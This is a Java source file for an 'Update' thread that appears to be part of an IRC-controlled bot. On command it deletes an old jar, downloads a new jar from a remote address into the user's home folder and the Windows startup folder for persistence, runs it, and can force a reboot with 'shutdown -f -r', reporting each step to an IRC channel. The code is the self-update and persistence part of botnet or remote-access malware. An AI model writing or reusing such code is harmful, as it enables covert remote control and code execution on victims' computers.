package mn.num;

import java.io.File;

public class Update extends Thread {
    private String updateLocation;
    private int restart;
    private String localName;
    private String oldFileName;
    private Downloader down;
    private CommandExecute command;

    public Update(String updateLocation, int restart, String localName, String oldFileName) {
        this.updateLocation = updateLocation;
        this.restart = restart;
        this.localName = localName;
        this.oldFileName = oldFileName;
    }

    public void run() {
        File file;
        IRC.sendMessage(Config.getChannel(), "[Update:] Deleteing old file!");
        file = new File(System.getProperty("user.home") + "//" + oldFileName + ".jar");
        file.delete();
        IRC.sendMessage(Config.getChannel(), "[Update:] Deleteted old file!!");
        IRC.sendMessage(Config.getChannel(), "[Update:] Starting to download update from " + updateLocation);
        down = new Downloader(updateLocation, System.getProperty("user.home") + "//" + localName + ".jar", 0);
        down.start();
        down = new Downloader(updateLocation, Misc.findStartup() + "//" + localName + ".jar", 0);
        down.start();
        CommandExecute cmd = new CommandExecute("START " + System.getProperty("user.home") + "//" + localName + ".jar");
        cmd.start();
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        if (restart == 1) {
            IRC.sendMessage(Config.getChannel(), "[Update:] Restart needed, expect connection to be closed!");
            command = new CommandExecute("shutdown -f -r");
            command.start();
            IRC.sendMessage(Config.getChannel(), "[Update:] Restart command executed!");
        } else {
            IRC.sendMessage(Config.getChannel(), "[Update:] Update downloaded, changes will not take effect " +
                    "until a restart has taken place!");
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            Restart res = new Restart(System.getProperty("user.home") + "//" + localName + ".jar", 5);
            res.start();
        }
    }

}